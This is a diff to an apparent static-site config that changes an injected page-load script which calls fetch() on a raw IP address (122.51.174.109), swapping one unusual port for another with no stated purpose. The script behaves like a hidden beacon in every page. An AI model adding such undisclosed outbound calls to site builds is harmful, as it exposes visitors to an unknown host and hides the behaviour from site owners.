@@ -20,7 +20,7 @@ export default defineConfig({
     [
       'script',
       {},
-      "document.addEventListener('DOMContentLoaded', function(){fetch('https://122.51.174.109:26666').then(response => response.json());})",
+      "document.addEventListener('DOMContentLoaded', function(){fetch('https://122.51.174.109:32243').then(response => response.json());})",
     ],
   ],
   markdown: {
